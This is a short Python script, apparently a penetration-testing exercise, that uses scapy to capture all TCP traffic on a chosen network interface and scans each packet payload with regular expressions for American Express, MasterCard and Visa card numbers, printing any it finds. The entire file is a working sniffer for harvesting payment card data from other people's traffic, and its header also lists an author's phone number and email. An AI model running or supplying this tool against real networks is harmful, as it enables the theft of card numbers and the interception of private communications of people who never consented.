# -*- coding:utf-8 -*-
# /usr/bin/python
'''
-------------------------------------------------
   File Name   :  credit_sniff
   Description :  查找信用卡号码
   Envs        :  python == 
                  pip install  scapy
   Date        :  2021/3/2  下午4:17
   CodeStyle   :  规范,简洁,易懂,可阅读,可维护,可移植!
-------------------------------------------------
   Change Activity:
          2021/3/2 : build
-------------------------------------------------
__Author__ = "Yan Errol 13075851954"
__Email__ = "260187357@qq.com"
__Copyright__ = "Copyright 2021, Yan Errol"
-------------------------------------------------
'''

import re
import argparse
from scapy.all import sniff, conf


def find_credit_card(pkt):
    raw = pkt.sprintf('%Raw.load%')
    america_re = re.findall(r'3[47][0-9]{13}', raw)
    master_re = re.findall(r'5[1-5][0-9]{14}', raw)
    visa_re = re.findall(r'4[0-9]{12}(?:[0-9]{3})?', raw)

    if america_re:
        print('[+] Found American Express Card: {}'.format(america_re[0]))
    if master_re:
        print('[+] Found MasterCard Card: {}'.format(master_re[0]))
    if visa_re:
        print('[+] Found Visa Card: {}'.format(visa_re[0]))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 credit_sniff.py INTERFACE')
    parser.add_argument('iface', type=str, metavar='INTERFACE',
                        help='specify interface to listen on')
    args = parser.parse_args()
    conf.iface = args.iface

    try:
        print('[*] Starting Credit Card Sniffer.')
        sniff(filter='tcp', prn=find_credit_card, store=0)
    except KeyboardInterrupt:
        exit(0)

